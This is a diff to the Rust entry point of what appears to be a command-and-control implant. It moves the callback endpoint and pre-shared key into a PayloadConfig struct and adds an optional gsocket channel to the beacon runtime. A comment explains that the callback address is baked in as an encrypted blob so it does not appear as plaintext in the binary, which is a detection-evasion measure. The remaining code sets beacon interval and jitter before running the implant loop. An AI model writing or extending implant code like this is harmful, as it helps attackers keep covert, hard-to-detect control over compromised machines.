@@ -1,6 +1,7 @@
 use std::time::Duration;
 
 use nw_implant::runtime::{BeaconRuntime, discover_profile};
+use nw_profile::config::PayloadConfig;
 
 fn main() -> anyhow::Result<()> {
     tracing_subscriber::fmt()
@@ -11,7 +12,7 @@ fn main() -> anyhow::Result<()> {
     // The builder bakes an encrypted blob (`NW_CFG`) so the callback isn't a
     // plaintext string in the binary; decrypt it back here. Runtime env
     // overrides / legacy plaintext baking are honoured as a dev convenience.
-    let (endpoint, psk) = match runtime_cfg() {
+    let config = match runtime_cfg() {
         Some(cfg) => cfg,
         None => {
             let e = std::env::var("NW_ENDPOINT")
@@ -30,7 +31,11 @@ fn main() -> anyhow::Result<()> {
                         .filter(|s| !s.is_empty())
                 })
                 .unwrap_or_else(|| "dev-psk-change-me".into());
-            (e, p)
+            PayloadConfig {
+                endpoint: e,
+                psk: p,
+                gsocket: None,
+            }
         }
     };
     let interval_ms = std::env::var("NW_INTERVAL")
@@ -45,11 +50,11 @@ fn main() -> anyhow::Result<()> {
         .unwrap_or(200);
 
     let profile = discover_profile(
-        endpoint,
+        config.endpoint,
         Duration::from_millis(interval_ms),
         Duration::from_millis(jitter_ms),
     );
-    let runtime = BeaconRuntime::new(profile, psk.into_bytes());
+    let runtime = BeaconRuntime::new_with_gsocket(profile, config.psk.into_bytes(), config.gsocket);
 
     let rt = tokio::runtime::Runtime::new()?;
     rt.block_on(async { std::sync::Arc::new(runtime).run().await })?;
@@ -57,8 +62,8 @@ fn main() -> anyhow::Result<()> {
 }
 
 /// Runtime-resolvable config: runtime `NW_CFG` env, then BAKED `NW_CFG`, and
-/// finally runtime `NW_ENDPOINT`. Returns `(endpoint, psk)`.
-fn runtime_cfg() -> Option<(String, String)> {
+/// finally runtime `NW_ENDPOINT`.
+fn runtime_cfg() -> Option<PayloadConfig> {
     let blob = std::env::var("NW_CFG")
         .ok()
         .filter(|s| !s.is_empty())
@@ -67,5 +72,5 @@ fn runtime_cfg() -> Option<(String, String)> {
                 .map(str::to_owned)
                 .filter(|s| !s.is_empty())
         })?;
-    nw_profile::config::decrypt_config(&blob).ok()
+    nw_profile::config::decrypt_payload_config(&blob).ok()
 }
